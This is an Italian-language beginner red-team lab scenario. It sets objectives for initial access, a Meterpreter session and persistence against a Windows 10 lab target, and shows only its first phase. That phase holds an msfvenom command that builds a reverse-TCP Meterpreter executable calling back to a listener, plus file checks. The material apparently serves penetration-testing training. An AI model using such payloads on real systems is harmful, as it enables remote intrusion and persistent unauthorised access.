# 🎯 Scenario: Penetrazione Base

## 📖 Panoramica Scenario

**Difficoltà**: 🟢 Principiante  
**Tempo Stimato**: 30-45 minuti  
**Obiettivi**: Ottenere accesso iniziale e stabilire foothold

### 🎯 Obiettivi di Apprendimento
- Generazione e delivery payload
- Stabilire sessione Meterpreter
- Enumerazione sistema base
- Setup persistenza base

## 🛠️ Prerequisiti

- ✅ Kali Linux configurato
- ✅ Windows 10 target accessibile
- ✅ Rete laboratorio funzionante
- ✅ Payload directory preparata

## 📋 Fasi dello Scenario

### Fase 1: Preparazione Payload
```bash
# Generare payload Windows reverso
cd /opt/redteam/payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe -o initial_access.exe

# Verifica payload generato
file initial_access.exe
ls -la initial_access.exe
